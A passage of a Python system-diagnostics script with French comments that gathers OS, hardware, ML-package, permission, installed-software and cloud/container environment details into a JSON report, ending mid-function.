#!/usr/bin/env python3
# Analyse système cross-platform (Windows, Mac, Linux, Colab, Cloud)
# Collecte: OS, CPU, GPU/TPU, Mémoire, Stockage, Réseau, IP, Docker/K8s, etc.
# Sortie JSON

import argparse
import getpass
import glob
import json
import os
import platform
import re
import shlex
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
from collections import Counter, OrderedDict
from datetime import datetime, timezone
from functools import wraps
from statistics import mode
from typing import Any, Dict, List, Optional

psutil = None
TRUTHY_ENV_VALUES = {"1", "true", "yes", "on"}

# ======================== UTILITAIRES ========================
def safe(default=None):
    """Décorateur pour gérer les exceptions et retourner une valeur par défaut."""
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            try:
                return fn(*args, **kwargs)
            except Exception:
                return default() if callable(default) else default
        return wrapper
    return decorator

def _ensure_psutil(allow_install: bool = False) -> Any:
    """Charge psutil, installe si autorisé."""
    try:
        import psutil as ps
        return ps
    except Exception:
        pass

    auto_install = os.environ.get("DETECTOS_AUTO_INSTALL") in TRUTHY_ENV_VALUES
    if not (allow_install or auto_install):
        return None

    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "psutil"], check=False)
        import psutil as ps
        return ps
    except Exception:
        return None

def _to_gib(n: Optional[float]) -> Optional[float]:
    return round(float(n) / (1024 ** 3), 2) if n is not None else None

def _to_gb(n: Optional[float]) -> Optional[float]:
    return round(float(n) / (1000 ** 3), 2) if n is not None else None

def _try_float(x: Optional[str]) -> Optional[float]:
    try:
        return float(str(x).strip()) if x else None
    except Exception:
        return None

def run_cmd(cmd: str, timeout: float = 2.5, shell_mode: bool = False) -> Dict[str, Any]:
    """Exécute une commande et retourne un dict structuré."""
    start = time.time()
    try:
        command = cmd if shell_mode else shlex.split(cmd)
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            text=True,
            shell=shell_mode,
        )
        return {
            "ok": proc.returncode == 0,
            "code": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
            "duration_s": round(time.time() - start, 3),
        }
    except FileNotFoundError:
        return {"ok": False, "error": "not_found", "duration_s": round(time.time() - start, 3)}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "timeout", "duration_s": round(time.time() - start, 3)}
    except Exception as e:
        return {"ok": False, "error": str(e), "duration_s": round(time.time() - start, 3)}

def http_get(url: str, headers: Optional[Dict[str, str]] = None, timeout: float = 0.5) -> Optional[str]:
    """Requête HTTP GET rapide."""
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read(1024).decode("utf-8", "ignore")
    except Exception:
        return None

def _get_version(cmd: str) -> Optional[str]:
    """Obtient la version d'un outil via commande."""
    if shutil.which(cmd.split()[0]) is None:
        return None

    r = run_cmd(cmd)
    out = (r.get("stdout") or r.get("stderr") or "").strip()
    return out.splitlines()[0] if out else None

def _parse_kv(text: str, sep: str = "=") -> Dict[str, str]:
    """Parse du texte clé=valeur en dict."""
    result = {}
    for line in text.splitlines():
        if sep in line:
            k, v = line.split(sep, 1)
            result[k.strip()] = v.strip().strip('"')
    return result

SYS = platform.system()

# ======================== CAPACITES IA/ML ========================
@safe(lambda: {"ml_packages": {}, "virtual_env": None, "ml_ready": False})
def detect_ml_capabilities() -> Dict[str, Any]:
    """Capacités pour IA/ML : packages Python, environnements, modèles."""
    info = {
        "ml_ready": False,
        "ml_packages": {},
        "virtual_env": os.environ.get("VIRTUAL_ENV") or os.environ.get("CONDA_PREFIX"),
        "conda_env": os.environ.get("CONDA_DEFAULT_ENV"),
    }

    # Vérifier packages ML courants
    ml_packages = ["torch", "torchvision", "torchaudio", "tensorflow", "jax", "transformers",
                   "diffusers", "accelerate", "datasets", "tokenizers", "numpy", "scipy",
                   "pandas", "scikit-learn", "matplotlib", "pillow", "opencv-python"]

    installed_packages = {}
    for pkg in ml_packages:
        try:
            __import__(pkg.replace("-", "_"))
            installed_packages[pkg] = True
        except Exception:
            installed_packages[pkg] = False

    info["ml_packages"] = installed_packages
    info["ml_ready"] = any(installed_packages.values())

    # Versions importantes
    try:
        import torch
        info["torch"] = {"version": torch.__version__, "cuda_available": torch.cuda.is_available(),
                        "mps_available": torch.backends.mps.is_available() if hasattr(torch.backends, 'mps') else False}
        if torch.cuda.is_available():
            info["torch"]["cuda_devices"] = torch.cuda.device_count()
            info["torch"]["cuda_version"] = torch.version.cuda
    except: pass

    try:
        import tensorflow as tf
        info["tensorflow"] = {"version": tf.__version__}
    except: pass

    try:
        import jax
        info["jax"] = {"version": jax.__version__}
    except: pass

    return info

@safe(dict)
def detect_cpu_advanced() -> Dict[str, Any]:
    """Capacités CPU avancées pour calculs intensifs."""
    info = {}

    # Instructions SIMD (pour ML/vectorisation)
    try:
        if SYS == "Linux":
            # Vérifier flags CPU
            r = run_cmd("grep -m1 'flags' /proc/cpuinfo", timeout=1.0)
            if r.get("ok") and r.get("stdout"):
                flags = r["stdout"].split(":")[-1].strip()
                info["simd_instructions"] = {
                    "avx": "avx" in flags,
                    "avx2": "avx2" in flags,
                    "avx512": "avx512" in flags,
                    "sse4_2": "sse4_2" in flags,
                    "fma": "fma" in flags
                }
        elif SYS == "Darwin":
            # sysctl pour Apple Silicon
            r = run_cmd("sysctl -n hw.optional.fma hw.optional.arm64", timeout=1.0)
            if r.get("ok") and r.get("stdout"):
                lines = r["stdout"].strip().split("\n")
                info["simd_instructions"] = {
                    "fma": lines[0].strip() == "1" if len(lines) > 0 else False,
                    "arm64": lines[1].strip() == "1" if len(lines) > 1 else False
                }
    except: pass

    # NUMA (pour gros serveurs)
    if SYS == "Linux" and shutil.which("numactl"):
        r = run_cmd("numactl --hardware", timeout=2.0)
        if r.get("ok"):
            info["numa_raw"] = r.get("stdout")

    return info

@safe(dict)
def detect_storage_performance() -> Dict[str, Any]:
    """Performance stockage pour datasets volumineux."""
    info = {"disk_performance": {}}

    # Test rapide I/O sur /tmp (ou autre)
    test_file = "/tmp/detectConfig_io_test.tmp"
    try:
        # Test écriture/lecture rapide
        test_data = b"0" * (1024 * 1024)  # 1MB

        # Test écriture
        start = time.time()
        with open(test_file, "wb") as f:
            for _ in range(10):  # 10MB total
                f.write(test_data)
        write_time = time.time() - start
        write_mb_s = 10 / write_time

        # Test lecture
        start = time.time()
        with open(test_file, "rb") as f:
            f.read()
        read_time = time.time() - start
        read_mb_s = 10 / read_time

        info["disk_performance"] = {
            "write_speed_mb_s": round(write_mb_s, 2),
            "read_speed_mb_s": round(read_mb_s, 2),
            "test_file_size_mb": 10
        }

        # Nettoyer
        os.remove(test_file)

    except Exception as e:
        info["disk_performance"]["error"] = str(e)

    # Espace disque disponible
    try:
        stat = os.statvfs("/")
        available_gb = (stat.f_bavail * stat.f_frsize) / (1024**3)
        total_gb = (stat.f_blocks * stat.f_frsize) / (1024**3)
        used_gb = total_gb - available_gb
        info["disk_space"] = {
            "total_gb": round(total_gb, 2),
            "available_gb": round(available_gb, 2),
            "used_gb": round(used_gb, 2),
            "used_percent": round((used_gb / total_gb) * 100, 1) if total_gb > 0 else 0
        }
    except: pass

    return info

@safe(dict)
def detect_accelerators() -> Dict[str, Any]:
    """Accélérateurs disponibles (GPU, TPU, autres)."""
    info = {}

    # NVIDIA GPU détaillé
    if shutil.which("nvidia-smi"):
        try:
            # Compute capability
            r = run_cmd("nvidia-smi --query-gpu=compute_cap --format=csv,noheader,nounits", timeout=2.0)
            if r.get("ok") and r.get("stdout"):
                caps = [line.strip() for line in r["stdout"].splitlines() if line.strip()]
                info["nvidia_compute_caps"] = caps

            # MIG (Multi-Instance GPU)
            r = run_cmd("nvidia-smi --query-gpu=mig.mode.current --format=csv,noheader,nounits", timeout=2.0)
            if r.get("ok") and r.get("stdout"):
                mig_modes = [line.strip() for line in r["stdout"].splitlines()]
                info["nvidia_mig_enabled"] = any(mode != "N/A" and mode != "Disabled" for mode in mig_modes)

        except: pass

    # AMD GPU (ROCm)
    if shutil.which("rocm-smi"):
        try:
            r = run_cmd("rocm-smi --showid --showproductname --showuniqueid", timeout=3.0)
            if r.get("ok"):
                info["amd_rocm_details"] = r.get("stdout")
        except: pass

    # Apple Silicon (macOS)
    if SYS == "Darwin":
        try:
            r = run_cmd("system_profiler SPDisplaysDataType -json", timeout=3.0)
            if r.get("ok") and r.get("stdout"):
                try:
                    data = json.loads(r["stdout"])
                    gpu_info = data.get("SPDisplaysDataType", [{}])[0] if data.get("SPDisplaysDataType") else {}
                    if "sppci_cores" in gpu_info:
                        info["apple_silicon_cores"] = gpu_info.get("sppci_cores")
                        info["apple_gpu_available"] = True
                except: pass
        except: pass

    # TPU (Google Cloud)
    if os.environ.get("COLAB_TPU_ADDR") or os.environ.get("TPU_IP_ADDRESS"):
        info["tpu_available"] = True
        info["tpu_address"] = os.environ.get("COLAB_TPU_ADDR") or os.environ.get("TPU_IP_ADDRESS")

        # Try to detect TPU type via JAX
        try:
            r = subprocess.run(
                [
                    sys.executable,
                    "-c",
                    "try:\n import jax; ds=jax.devices(); print([str(d) for d in ds if 'tpu' in str(d).lower()])\nexcept: print([])",
                ],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if r.returncode == 0 and r.stdout.strip():
                info["tpu_devices"] = r.stdout.strip()
        except: pass

    return info

@safe(dict)
def detect_user_permissions() -> Dict[str, Any]:
    """Droits et permissions utilisateur complets."""
    info = {}

    # UID/GID
    try:
        info["uid"] = os.geteuid()
        info["gid"] = os.getegid()
        info["is_root"] = info["uid"] == 0
    except:
        pass

    # Groupes utilisateur
    try:
        import grp
        groups = []
        for g in set(os.getgroups()):
            try:
                groups.append(grp.getgrgid(g).gr_name)
            except:
                groups.append(str(g))
        info["groups"] = sorted(groups)
        
        # Groupes privilégiés
        admin_groups = {"sudo", "wheel", "admin", "Administrators", "root", "docker", "video", "render"}
        info["privileged_groups"] = [g for g in groups if g in admin_groups]
    except:
        pass

    # Droits sudo
    info["sudo_available"] = shutil.which("sudo") is not None
    if info["sudo_available"]:
        r = run_cmd("sudo -n true", timeout=1.0)
        info["sudo_no_password"] = r.get("ok", False)

    # Windows Admin
    if SYS == "Windows":
        try:
            import ctypes
            info["is_admin_windows"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except:
            pass

    # Permissions répertoires importants
    dirs_to_check = [
        os.getcwd(),
        os.path.expanduser("~"),
        "/tmp",
        "/var/tmp",
        "/usr/local",
        "/opt",
        os.path.expanduser("~/.cache"),
        os.path.expanduser("~/.local"),
        os.path.expanduser("~/.config"),
    ]
    
    if SYS == "Darwin":
        dirs_to_check.extend(["/Applications", os.path.expanduser("~/Library")])
    elif SYS == "Windows":
        dirs_to_check.extend([os.environ.get("PROGRAMFILES", ""), os.environ.get("APPDATA", "")])

    permissions = {}
    for path in dirs_to_check:
        if not path:
            continue
        expanded = os.path.expanduser(path)
        perm = {"exists": os.path.exists(expanded)}
        if perm["exists"]:
            perm["readable"] = os.access(expanded, os.R_OK)
            perm["writable"] = os.access(expanded, os.W_OK)
            perm["executable"] = os.access(expanded, os.X_OK)
        permissions[path] = perm

    info["directory_permissions"] = permissions

    # Permissions réseau
    network_perms = {"internet_access": False, "https_access": False}
    try:
        with urllib.request.urlopen("https://www.google.com", timeout=3.0) as response:
            network_perms["internet_access"] = True
            network_perms["https_access"] = True
    except:
        pass
    info["network_permissions"] = network_perms

    # Permissions GPU
    gpu_perms = {}
    if shutil.which("nvidia-smi"):
        r = run_cmd("nvidia-smi -L", timeout=2.0)
        gpu_perms["nvidia_accessible"] = r.get("ok", False)
    try:
        import torch
        gpu_perms["cuda_available"] = torch.cuda.is_available()
        gpu_perms["mps_available"] = torch.backends.mps.is_available() if hasattr(torch.backends, 'mps') else False
    except:
        pass
    if gpu_perms:
        info["gpu_permissions"] = gpu_perms

    # Permissions d'installation
    install_perms = {}
    
    # pip
    if shutil.which("pip") or shutil.which("pip3"):
        r = run_cmd("pip show pip", timeout=2.0)
        install_perms["pip_available"] = r.get("ok", False)
        # Test écriture dans site-packages
        try:
            import site
            user_site = site.getusersitepackages()
            install_perms["pip_user_install"] = os.access(os.path.dirname(user_site), os.W_OK) if user_site else False
        except:
            pass

    # conda
    if shutil.which("conda"):
        r = run_cmd("conda info", timeout=2.0)
        install_perms["conda_available"] = r.get("ok", False)

    # brew (macOS)
    if shutil.which("brew"):
        r = run_cmd("brew --prefix", timeout=2.0)
        install_perms["brew_available"] = r.get("ok", False)
        if r.get("ok"):
            install_perms["brew_writable"] = os.access(r.get("stdout", "").strip(), os.W_OK)

    # apt (Debian/Ubuntu)
    if shutil.which("apt"):
        install_perms["apt_available"] = True
        install_perms["apt_writable"] = os.access("/var/lib/apt", os.W_OK)

    # dnf/yum (RedHat/Fedora)
    if shutil.which("dnf"):
        install_perms["dnf_available"] = True
    elif shutil.which("yum"):
        install_perms["yum_available"] = True

    info["install_permissions"] = install_perms

    return info

@safe(dict)
def detect_installed_software() -> Dict[str, Any]:
    """Liste des logiciels et paquets installés."""
    info = {}

    # Paquets Python (pip)
    r = run_cmd("pip list --format=json", timeout=10.0)
    if r.get("ok") and r.get("stdout"):
        try:
            pip_packages = json.loads(r["stdout"])
            info["pip_packages"] = pip_packages
            info["pip_packages_count"] = len(pip_packages)
        except:
            pass

    # Paquets conda
    if shutil.which("conda"):
        r = run_cmd("conda list --json", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            try:
                conda_packages = json.loads(r["stdout"])
                info["conda_packages"] = conda_packages
                info["conda_packages_count"] = len(conda_packages)
            except:
                pass

    # Homebrew (macOS)
    if shutil.which("brew"):
        r = run_cmd("brew list --versions", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            formulas = []
            for line in r["stdout"].splitlines():
                if not line.strip(): continue
                parts = line.split()
                if parts:
                    formulas.append({"name": parts[0], "versions": parts[1:]})
            if formulas:
                info["brew_formulas"] = formulas
                info["brew_formulas_count"] = len(formulas)
        
        r = run_cmd("brew list --cask --versions", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            casks = []
            for line in r["stdout"].splitlines():
                if not line.strip(): continue
                parts = line.split()
                if parts:
                    casks.append({"name": parts[0], "versions": parts[1:]})
            if casks:
                info["brew_casks"] = casks
                info["brew_casks_count"] = len(casks)

    # APT (Debian/Ubuntu)
    if shutil.which("dpkg"):
        r = run_cmd("dpkg --get-selections | wc -l", timeout=5.0, shell_mode=True)
        if r.get("ok") and r.get("stdout"):
            try:
                info["dpkg_packages_count"] = int(r["stdout"].strip())
            except:
                pass
        
        # Liste détaillée avec versions
        r = run_cmd("dpkg-query -W -f='${Package} ${Version}\\n'", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            packages = []
            for line in r["stdout"].splitlines():
                if not line.strip(): continue
                parts = line.split()
                if len(parts) >= 2:
                    packages.append({"name": parts[0], "version": " ".join(parts[1:])})
            if packages:
                info["apt_packages"] = packages
                info["apt_packages_count"] = len(packages)

    # RPM (RedHat/Fedora)
    if shutil.which("rpm"):
        r = run_cmd("rpm -qa | wc -l", timeout=5.0, shell_mode=True)
        if r.get("ok") and r.get("stdout"):
            try:
                info["rpm_packages_count"] = int(r["stdout"].strip())
            except:
                pass
        r = run_cmd("rpm -qa --queryformat '%{NAME} %{VERSION}-%{RELEASE}\\n'", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            rpms = []
            for line in r["stdout"].splitlines():
                if not line.strip(): continue
                parts = line.split()
                if len(parts) >= 2:
                    rpms.append({"name": parts[0], "version": " ".join(parts[1:])})
            if rpms:
                info["rpm_packages"] = rpms

    # Snap
    if shutil.which("snap"):
        r = run_cmd("snap list", timeout=5.0)
        if r.get("ok") and r.get("stdout"):
            snap_packages = []
            for line in r["stdout"].splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 2:
                    snap_packages.append({"name": parts[0], "version": parts[1]})
            info["snap_packages"] = snap_packages
            info["snap_packages_count"] = len(snap_packages)

    # Flatpak
    if shutil.which("flatpak"):
        r = run_cmd("flatpak list --columns=application,version", timeout=5.0)
        if r.get("ok") and r.get("stdout"):
            flatpak_apps = []
            for line in r["stdout"].splitlines()[1:]:
                parts = [p for p in line.split() if p]
                if parts:
                    name = parts[0]
                    version = parts[1] if len(parts) > 1 else None
                    flatpak_apps.append({"name": name, "version": version})
            info["flatpak_apps"] = flatpak_apps
            info["flatpak_apps_count"] = len(flatpak_apps)

    # NPM global packages
    if shutil.which("npm"):
        r = run_cmd("npm list -g --depth=0 --json", timeout=10.0)
        if r.get("ok") and r.get("stdout"):
            try:
                npm_data = json.loads(r["stdout"])
                deps = npm_data.get("dependencies", {})
                npm_packages = [{"name": k, "version": v.get("version")} for k, v in deps.items()]
                info["npm_global_packages"] = npm_packages
                info["npm_global_count"] = len(npm_packages)
            except:
                pass

    # Cargo (Rust)
    if shutil.which("cargo"):
        r = run_cmd("cargo install --list", timeout=5.0)
        if r.get("ok") and r.get("stdout"):
            cargo_packages = []
            for line in r["stdout"].splitlines():
                if not line or line.startswith(" "): continue
                parts = line.split()
                if len(parts) >= 2 and parts[1].startswith("v"):
                    cargo_packages.append({"name": parts[0], "version": parts[1].lstrip("v").rstrip(":")})
                else:
                    cargo_packages.append({"name": parts[0]})
            info["cargo_packages"] = cargo_packages
            info["cargo_packages_count"] = len(cargo_packages)

    # Go packages
    if shutil.which("go"):
        go_path = os.environ.get("GOPATH", os.path.expanduser("~/go"))
        go_bin = os.path.join(go_path, "bin")
        if os.path.isdir(go_bin):
            go_packages = [f for f in os.listdir(go_bin) if os.path.isfile(os.path.join(go_bin, f))]
            info["go_packages"] = go_packages
            info["go_packages_count"] = len(go_packages)

    # Applications macOS
    if SYS == "Darwin":
        apps_dirs = ["/Applications", os.path.expanduser("~/Applications")]
        mac_apps = []
        for apps_dir in apps_dirs:
            if os.path.isdir(apps_dir):
                for app in os.listdir(apps_dir):
                    if app.endswith(".app"):
                        mac_apps.append({"name": app.replace(".app", "")})
        if mac_apps:
            info["macos_apps"] = sorted(mac_apps, key=lambda x: x["name"])
            info["macos_apps_count"] = len(mac_apps)

    # Windows programs
    if SYS == "Windows":
        r = run_cmd('wmic product get name,version /format:list', timeout=30.0)
        if r.get("ok") and r.get("stdout"):
            win_programs = []
            for line in r["stdout"].splitlines():
                line = line.strip()
                if line.startswith("Name="):
                    name = line.split("=", 1)[1].strip()
                    win_programs.append({"name": name})
                if line.startswith("Version=") and win_programs:
                    win_programs[-1]["version"] = line.split("=", 1)[1].strip()
            if win_programs:
                info["windows_programs"] = sorted(win_programs, key=lambda x: x.get("name") or "")
                info["windows_programs_count"] = len(win_programs)

    return info

@safe(dict)
def detect_system_limits() -> Dict[str, Any]:
    """Limites système pour gros calculs."""
    info = {}

    # Limites de processus/fichiers
    try:
        import resource
        limits = {}
        limit_names = ['RLIMIT_NOFILE', 'RLIMIT_NPROC', 'RLIMIT_AS', 'RLIMIT_DATA', 'RLIMIT_STACK']
        for limit_name in limit_names:
            if hasattr(resource, limit_name):
                soft, hard = resource.getrlimit(getattr(resource, limit_name))
                limits[limit_name.lower()] = {"soft": soft, "hard": hard}
        info["resource_limits"] = limits
    except: pass

    # Mémoire système
    if psutil:
        try:
            vm = psutil.virtual_memory()
            sm = psutil.swap_memory()
            info["memory_limits"] = {
                "ram_total_gb": round(vm.total / (1024**3), 2),
                "ram_available_gb": round(vm.available / (1024**3), 2),
                "swap_total_gb": round(sm.total / (1024**3), 2),
                "swap_free_gb": round(sm.free / (1024**3), 2)
            }

            # Recommandations ML
            ram_gb = vm.total / (1024**3)
            if ram_gb > 64:
                info["ml_memory_class"] = "high_end"
            elif ram_gb > 16:
                info["ml_memory_class"] = "workstation"
            elif ram_gb > 8:
                info["ml_memory_class"] = "standard"
            else:
                info["ml_memory_class"] = "limited"

        except: pass

    # CPU threads disponibles
    try:
        info["cpu_threads_available"] = os.cpu_count()
    except: pass

    return info

# ======================== DETECTION OS ========================
@safe(dict)
def detect_os() -> Dict[str, Any]:
    """Système d'exploitation, kernel, distribution Linux."""
    distro = None
    if SYS == "Linux" and os.path.exists("/etc/os-release"):
        try:
            with open("/etc/os-release", "r", encoding="utf-8", errors="ignore") as f:
                data = _parse_kv(f.read())
            distro = {k: data.get(k) for k in ["ID", "NAME", "VERSION", "PRETTY_NAME"]}
        except: pass
    return {
        "system": SYS or None, "release": platform.release() or None,
        "version": platform.version() or None, "kernel": platform.uname().release,
        "machine": platform.machine() or None, "platform": sys.platform, "distro": distro
    }

# ======================== ENVIRONNEMENT D'EXECUTION ========================
@safe(dict)
def detect_runtime_env() -> Dict[str, Any]:
    """Détecte type machine, Colab, Docker, K8s, Cloud provider."""
    env = os.environ
    in_colab = bool(env.get("COLAB_GPU") or env.get("COLAB_TPU_ADDR") or env.get("COLAB_RELEASE_TAG"))
    in_k8s = bool(env.get("KUBERNETES_SERVICE_HOST") or os.path.exists("/var/run/secrets/kubernetes.io"))
    in_docker = os.path.exists("/.dockerenv")
    try:
        with open("/proc/1/cgroup", "r", encoding="utf-8", errors="ignore") as f:
            cg = f.read()
            if any(x in cg for x in ["docker", "containerd", "kubepods"]):
                in_docker = True
    except: pass

    # Cloud provider detection
    provider = None
    if http_get("http://169.254.169.254/latest/meta-data/ami-id"):
        provider = "aws"
    elif http_get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}):
        provider = "azure"
    elif http_get("http://169.254.169.254/computeMetadata/v1/instance/id", {"Metadata-Flavor": "Google"}):
        provider = "gcp"
    elif http_get("http://169.254.169.254/opc/v2/instance/", {"Authorization": "Bearer Oracle"}):
        provider = "oci"

    # Machine type
    if in_colab:
        mt = "Google Colab"
    elif provider:
        mt = f"Cloud VM ({provider})"
    elif in_k8s:
        mt = "Kubernetes Pod"
    elif in_docker:
        mt = "Docker Container"
    elif SYS == "Darwin":
        mt = "Mac"
    elif SYS == "Windows":
        mt = "PC (Windows)"
    elif SYS == "Linux":
        mt = "Linux"
    else:
        mt = SYS or None

    # Remote detection
    reasons = []
    if env.get("SSH_CONNECTION") or env.get("SSH_TTY"):
        reasons.append("ssh_session")
    if provider:
        reasons.append(f"cloud:{provider}")
    if in_k8s:
        reasons.append("kubernetes_pod")
    if in_docker:
        reasons.append("docker_container")
    if env.get("CI"):
        reasons.append("ci_env")
    if env.get("VSCODE_IPC_HOOK"):
        reasons.append("vscode_remote_hint")
    
    return {
        "machine_type": mt, "colab": in_colab, "docker": in_docker,
        "docker_desktop_hint": bool(env.get("DOCKER_DESKTOP") or env.get("WSL_INTEROP")),
        "kubernetes": in_k8s, "cloud_provider": provider,
        "cloud_detail": None, "is_remote": len(reasons) > 0,
        "remote_reasons": reasons or None
    }

# ======================== UI ENVIRONMENT ========================
@safe(dict)
def detect_ui_env() -> Dict[str, Any]:
    """Détecte CLI vs Desktop (GUI)."""
    mode, reasons = "cli", []
    if os.environ.get("SSH_CONNECTION") or os.environ.get("SSH_TTY"):
        reasons.append("ssh_session")
    
    if SYS == "Linux":
        xdg, disp, way = os.environ.get("XDG_SESSION_TYPE"), os.environ.get("DISPLAY"), os.environ.get("WAYLAND_DISPLAY")
        if xdg in ("x11", "wayland") or disp or way:
            mode = "desktop"
            if xdg: reasons.append(f"xdg_session_type={xdg}")
            if disp: reasons.append("DISPLAY")
            if way: reasons.append("WAYLAND_DISPLAY")
        else: reasons.append("no_display_vars")
    elif SYS == "Darwin":
        if not (os.environ.get("SSH_CONNECTION") or os.environ.get("SSH_TTY")):
            mode, reasons = "desktop", ["macos_gui_default"]
    elif SYS == "Windows":
        sess = os.environ.get("SESSIONNAME")
        if sess: mode, reasons = "desktop", [f"session={sess}"]
        else: reasons.append("no_sessionname")
    elif os.environ.get("DISPLAY"):
        mode, reasons = "desktop", ["DISPLAY"]
    
    return {"mode": mode, "reasons": reasons or None}

# ======================== SESSION UTILISATEUR ========================
@safe(dict)
def detect_user_session() -> Dict[str, Any]:
    """Utilisateur, shell, UID/GID, droits admin, home/cwd."""
    info = {}
    try: info["username"] = getpass.getuser()
    except: info["username"] = os.environ.get("USER") or os.environ.get("USERNAME")
    
    info["user_env"] = {k: os.environ.get(k) for k in ["USER", "LOGNAME", "USERNAME"]}
    info["shell"] = os.environ.get("SHELL") or os.environ.get("COMSPEC")
    info["ssh_tty"] = os.environ.get("SSH_TTY")
    t = run_cmd("tty")
    info["tty"] = t.get("stdout") if t.get("ok") else None
    
    uid = gid = None
    try: uid = os.geteuid()
    except: pass
    try: gid = os.getegid()
    except: pass
    info["uid"], info["gid"] = uid, gid
    
    # Groups
    group_names = []
    try:
        import grp
        for g in set(os.getgroups()):
            try: group_names.append(grp.getgrgid(g).gr_name)
            except: continue
    except: pass
    if group_names: info["groups"] = sorted(group_names)
    
    # Admin rights
    info["is_root"] = uid == 0 if uid is not None else False
    if SYS == "Windows":
        try:
            import ctypes
            info["is_admin_windows"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except: pass
    
    admin_groups = {"sudo", "wheel", "admin", "Administrators"}
    info["in_admin_group"] = any(g in admin_groups for g in group_names)
    info["sudo_available"] = shutil.which("sudo") is not None
    info["home"] = os.path.expanduser("~")
    info["cwd"] = os.getcwd()
    
    try:
        host = socket.gethostname()
        info["session_name"] = f"{info.get('username', 'user')}@{host}" if host else info.get("username", "user")
    except: pass
    
    return info

# ======================== TYPE D'EXECUTION ========================
@safe(dict)
def detect_execution_type() -> Dict[str, Any]:
    """Contexte Python/Jupyter/Colab, langages disponibles, kernels."""
    env = os.environ
    in_colab = bool(env.get("COLAB_GPU") or env.get("COLAB_TPU_ADDR") or env.get("COLAB_RELEASE_TAG"))
    in_kaggle = bool(env.get("KAGGLE_KERNEL_RUN_TYPE"))
    in_jupyter = bool(env.get("JPY_PARENT_PID") or env.get("IPYTHONDIR"))
    try:
        from IPython import get_ipython
        if get_ipython() is not None: in_jupyter = True
    except: pass
    
    info = {
        "type": "Python", "Type d'exécution": "Python",
        "python": {"version": sys.version.split("\n")[0], "executable": sys.executable},
        "context": {"colab": in_colab, "kaggle": in_kaggle, "jupyter": in_jupyter}
    }
    
    # Available languages
    avail = {
        "Python": _get_version("python --version") or _get_version("python3 --version"),
        "R": _get_version("R --version"), "Rscript": _get_version("Rscript --version"),
        "Julia": _get_version("julia --version")
    }
    info["available_languages"] = {k: v for k, v in avail.items() if v}
    
    # Jupyter kernels
    if shutil.which("jupyter"):
        r = run_cmd("jupyter kernelspec list --json", timeout=3.0)
        if r.get("ok") and r.get("stdout", "").strip().startswith("{"):
            try:
                kjson = json.loads(r["stdout"])
                info["jupyter_kernels"] = [
                    {"name": name, "display_name": spec.get("spec", {}).get("display_name"),
                     "language": spec.get("spec", {}).get("language")}
                    for name, spec in kjson.get("kernelspecs", {}).items()
                ]
            except: pass
    
    return info

# ======================== CPU ========================
@safe(dict)
def detect_cpu() -> Dict[str, Any]:
    """CPU: marque, coeurs, fréquences, caches."""
    info = {}
    brand = None
    
    if SYS == "Darwin":
        r = run_cmd("sysctl -n machdep.cpu.brand_string")
        if r.get("ok"): brand = r.get("stdout")
    elif SYS == "Linux":
        try:
            with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.lower().startswith("model name"):
                        brand = line.split(":", 1)[1].strip()
                        break
        except: pass
        if not brand:
            r = run_cmd("lscpu")
            if r.get("ok"):
                m = re.search(r"Model name:\s*(.+)", r["stdout"])
                if m: brand = m.group(1).strip()
    elif SYS == "Windows":
        brand = platform.processor() or None
    
    info["brand"] = brand or platform.processor() or None
    
    if psutil:
        try:
            info["physical_cores"] = psutil.cpu_count(logical=False)
            info["logical_cores"] = psutil.cpu_count(logical=True)
            f = psutil.cpu_freq()
            if f: info["frequency_mhz"] = {"current": f.current, "min": f.min, "max": f.max}
        except: pass
    
    # Caches
    caches = {}
    if SYS == "Linux":
        r = run_cmd("lscpu")
        if r.get("ok"):
            for key in ["L1d cache", "L1i cache", "L2 cache", "L3 cache"]:
                m = re.search(fr"{re.escape(key)}:\s*(.+)", r["stdout"])
                if m: caches[key] = m.group(1).strip()
    elif SYS == "Darwin":
        for k, name in [("hw.l1icachesize", "L1i"), ("hw.l1dcachesize", "L1d"),
                        ("hw.l2cachesize", "L2"), ("hw.l3cachesize", "L3")]:
            r = run_cmd(f"sysctl -n {k}")
            if r.get("ok") and r.get("stdout"):
                try: caches[name] = f"{int(r['stdout'].strip())} bytes"
                except: caches[name] = r["stdout"].strip()
    if caches: info["caches"] = caches
    
    return info

# ======================== MEMOIRE ========================
@safe(dict)
def detect_memory() -> Dict[str, Any]:
    """RAM et swap avec conversions GiB/GB."""
    mem = {}
    
    if psutil:
        try:
            vm = psutil.virtual_memory()
            sm = psutil.swap_memory()
            mem["ram"] = {
                "total": vm.total, "available": vm.available,
                "total_gib": _to_gib(vm.total), "available_gib": _to_gib(vm.available),
                "total_gb": _to_gb(vm.total), "available_gb": _to_gb(vm.available)
            }
            mem["swap"] = {
                "total": sm.total, "used": sm.used,
                "total_gib": _to_gib(sm.total), "used_gib": _to_gib(sm.used),
                "total_gb": _to_gb(sm.total), "used_gb": _to_gb(sm.used)
            }
        except: pass
    else:
        if SYS == "Darwin":
            r = run_cmd("sysctl -n hw.memsize")
            if r.get("ok") and r.get("stdout"):
                try: mem.setdefault("ram", {})["total"] = int(r["stdout"].strip())
                except: pass
            r4 = run_cmd("sysctl vm.swapusage")
            if r4.get("ok"): mem["swap_info"] = r4.get("stdout")
    
    # Linux /proc/meminfo details
    if SYS == "Linux" and os.path.exists("/proc/meminfo"):
        try:
            with open("/proc/meminfo", "r", encoding="utf-8", errors="ignore") as f:
                data = _parse_kv(f.read(), ":")
            mem["details"] = {k: data.get(k) for k in 
